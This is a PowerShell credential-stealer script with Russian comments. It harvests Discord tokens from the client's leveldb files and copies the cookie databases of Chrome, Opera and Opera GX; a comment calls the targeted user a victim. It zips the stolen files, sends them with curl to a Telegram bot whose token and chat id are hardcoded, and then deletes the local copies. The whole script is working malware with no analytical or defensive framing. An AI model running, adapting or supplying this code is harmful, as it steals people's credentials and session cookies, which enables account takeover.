# НАСТРОЙКИ ТГ
$botToken = "8775216222:AAGRYC6FinsJPr9_UEXTY42Gk_eNYW66wn4"
$chatId = "7719438428"

$tempPath = $env:TEMP
$zipPath = "$tempPath\data.zip"
$filesToZip = @()

# 1. СБОР ТОКЕНОВ DISCORD
$discordPath = "$env:APPDATA\discord\Local Storage\leveldb"
$discordTokens = @()
if (Test-Path $discordPath) {
    Get-ChildItem "$discordPath\*.ldb" | ForEach-Object {
        $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
        $matches = [regex]::Matches($content, '[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9]{27}')
        foreach ($m in $matches) {
            $discordTokens += $m.Value
        }
    }
}
if ($discordTokens.Count -gt 0) {
    $discordTokens | Out-File "$tempPath\discord.txt" -Encoding utf8
    $filesToZip += "$tempPath\discord.txt"
}

# 2. СБОР КУКИ ВК (Грубый метод, копируем базу)
# Современный Chrome шифрует их, но если у жертвы Opera или старый Chrome, это сработает
$browserPaths = @(
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies",
    "$env:APPDATA\Opera Software\Opera Stable\Default\Network\Cookies",
    "$env:APPDATA\Opera Software\Opera GX Stable\Default\Network\Cookies"
)

foreach ($path in $browserPaths) {
    if (Test-Path $path) {
        $browserName = (Get-Item $path).Directory.Parent.Parent.Name
        $dest = "$tempPath\cookies_$browserName.db"
        Copy-Item $path $dest -Force
        if (Test-Path $dest) {
            $filesToZip += $dest
        }
    }
}

# 3. ОТПРАВКА В ТГ
if ($filesToZip.Count -gt 0) {
    Compress-Archive -Path $filesToZip -DestinationPath $zipPath -Force
    
    $url = "https://api.telegram.org/bot$botToken/sendDocument"
    curl.exe -s -F "chat_id=$chatId" -F "document=@$zipPath" $url > $null
    
    Remove-Item $zipPath
    foreach ($f in $filesToZip) { Remove-Item $f -Force }
}